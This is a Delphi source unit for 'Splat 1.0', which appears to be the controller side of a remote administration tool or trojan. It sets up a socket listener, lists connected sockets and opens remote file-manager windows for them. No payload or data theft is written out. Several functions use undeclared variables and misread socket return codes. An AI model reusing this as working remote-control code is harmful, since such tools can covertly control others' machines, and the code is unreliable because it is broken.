   unit untClient;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
     Dialogs, StdCtrls, ExtCtrls, ComCtrls, Menus, untFilemng, ScktComp, WinSock;

   type
     TSplat = Class(TObject)
     Private
       WSAData     :TWSAData;
       SockAddr    :TSockAddrIn;
       Buffer      :Array[0..1600] Of Char;
       IncomeText  :String;
     Public
       Sock        :TSocket;
       Active      :Bool;
       Port        :Integer;
       Function    StartServer:    Bool;
       Function    DoReceive:      Bool;
       Function    IsDead:         Bool;
     End;

     TForm2 = class(TForm)
       StatusBar1: TStatusBar;
       Panel1: TPanel;
       Image1: TImage;
       Label1: TLabel;
       Edit1: TEdit;
       Label2: TLabel;
       Edit2: TEdit;
       Button1: TButton;
       Bevel1: TBevel;
       ListView1: TListView;
       PopupMenu1: TPopupMenu;
       Refresh1: TMenuItem;
       Disconnect1: TMenuItem;
       N1: TMenuItem;
       Filemanager1: TMenuItem;
       procedure FormClose(Sender: TObject; var Action: TCloseAction);
       procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
       procedure Filemanager1Click(Sender: TObject);
       procedure ListView1MouseDown(Sender: TObject; Button: TMouseButton;
         Shift: TShiftState; X, Y: Integer);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form2: TForm2;
     FileMng: Array[0..100] Of TForm3;

   implementation

   {$R *.dfm}

   {
   Procedure Server(Port_: Integer);
   Var
     WSAData       : TWSAData;
     Size          : Integer;
     Sock2         : TSocket;
     Sock          : TSocket;
     SockAddr      : TSockAddr;
     SockAddrIn    : TSockAddrIn;
     I, J          : Integer;
   Begin
     ZeroMemory(@I, SizeOf(I));
     ZeroMemory(@J, SizeOf(J));

     WSAStartUp(MakeWord(2,2), WSAData);

     Sock := Socket(PF_INET, SOCK_STREAM, 0);
     SockAddrIn.sin_family := AF_INET;
     SockAddrIn.sin_port := hTons(port_);
     SockAddrIn.sin_addr.S_addr := INADDR_ANY;

     Bind(Sock, SockAddrIn, SizeOf(SockAddrIn));

     Winsock.Listen(Sock, 5);

     Repeat
       UserLoggedin := False;
       Size := SizeOf(TSockAddr);
       Sock2 := Winsock.Accept(Sock, @SockAddr, @Size);
       If Not WildCardIP(GetRemoteAddress(Sock2)) Then
         CloseSocket(Sock2);
       If Sock2 <> INVALID_SOCKET Then
         ReadData(Sock2);
     Until CloseServer;

     CloseSocket(Sock2);
     CloseSocket(Sock );
     WSACleanUp;
   End;
   }

   Function    TSplat.StartServer:    Bool;
   Begin
     Result := False;
     Active := False;
     WSAStartUp(MakeWord(1,1), WSAData);

     Sock := Socket(PF_INET, SOCK_STREAM, 0);
     SockAddr.sin_family := AF_INET;
     SockAddr.sin_port := hTons(Port);
     SockAddr.sin_addr.S_addr := INADDR_ANY;

     If (Bind(Sock, SockAddrIn, SizeOf(SockAddrIn)) <= 0) Then
       Exit;

     If (WinSock.Listen(Sock, 5) <= 0) Then
       Exit;

     Active := True;
     Result := True;
     Repeat
       Size := SizeOf(TSockAddr);

     Until (Not Active);

     CloseSocket(Sock2);
     CloseSocket(Sock );
     WSACleanUp;
   End;

   procedure TForm2.FormClose(Sender: TObject; var Action: TCloseAction);
   begin
     ExitProcess(0);
   end;

   procedure TForm2.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
   begin
     If CanClose Then
       ExitProcess(0);
   end;

   procedure TForm2.Filemanager1Click(Sender: TObject);
   var
     FormCount     :Integer;
     Temp          :Array[0..100] Of TForm3;
     I             :Integer;
   begin
     ZeroMemory(@Temp, SizeOf(Temp));
     ZeroMemory(@I, SizeOf(I));
     FormCount := 0;

     For I := 0 To 100 Do
       If (FileMng[I] <> NIL) Then
         If (FileMng[I].Visible) Then
         Begin
           Temp[FormCount] := FileMng[I];
           Inc(FormCount);
         End;

     ZeroMemory(@I, SizeOf(I));
     FillChar(FileMng, 100, 0);

     For I := 0 To 100 Do
       FileMng[I] := Temp[I];

     ZeroMemory(@I, SizeOf(I));
     If (FormCount >= 99) Then
     Begin
       MessageBox(0, 'To many FileManager screens open', 'Error', mb_ok or mb_iconhand);
       Exit;
     End Else
     Begin
       Application.CreateForm(TForm3, FileMng[FormCount]);
       FileMng[FormCount].Caption := 'Splat 1.0 - Filemanager';
       FileMng[FormCount].Sock := StrToInt(ListView1.ItemFocused.SubItems[0]);
       FileMng[FormCount].StatusBar1.Panels[0].Text := 'Socket: '+
                          ListView1.ItemFocused.SubItems[0];
       FileMng[FormCount].StatusBar1.Panels[1].Text := 'Received: NULL';
       FileMng[FormCount].Show;
     End;
     ZeroMemory(@I, SizeOf(I));
   end;

   procedure TForm2.ListView1MouseDown(Sender: TObject; Button: TMouseButton;
     Shift: TShiftState; X, Y: Integer);
   var
     P     :TPoint;
   begin
     If (Button = mbRight) Then
     Begin
       If (ListView1.ItemIndex > -1) Then
       Begin
         If (ListView1.ItemFocused.SubItems[0] <> '0') Then
         Begin
           GetCursorPos(P);
           PopupMenu1.Popup(P.X, P.Y);
         End;
       End;
     End;
   end;

   end.
